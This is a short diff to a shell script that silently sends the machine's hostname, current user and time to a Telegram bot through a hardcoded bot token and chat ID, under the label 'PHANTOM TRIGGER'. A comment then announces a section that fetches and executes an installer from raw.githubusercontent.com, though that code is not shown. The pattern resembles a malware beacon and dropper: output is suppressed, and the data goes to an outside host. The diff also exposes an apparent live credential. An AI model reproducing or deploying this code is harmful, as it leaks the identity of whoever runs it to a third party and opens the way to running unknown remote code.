@@ -5,9 +5,16 @@
 # SECTION 1: TELEGRAM INSTANT PING
 BOT_TOKEN="8602911604:AAGZs2G4n1DNFc9zzAcmsZyYdEWP1ARXh80"
 CHAT_ID="5439698489"
-MSG="OYEN_TRIGGER:$(hostname):$(whoami):$(date +%s)"
+
+MSG="<b>PHANTOM TRIGGER</b> 
+<b>HOST :</b> <code>$(hostname)</code> 
+<b>USER :</b> <code>$(whoami)</code> 
+<b>TIME :</b> $(date '+%Y-%m-%d %H:%M:%S UTC')"
+
 curl --fail --silent --max-time 10 -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
-    -d "chat_id=${CHAT_ID}" -d "text=${MSG}" >/dev/null 2>&1
+  -d "chat_id=${CHAT_ID}" \
+  -d "parse_mode=HTML" \
+  -d "text=${MSG}" >/dev/null 2>&1
 
 # SECTION 2: FETCH AND EXECUTE INSTALLER
 # Using strictly the raw.githubusercontent.com domain for stability.
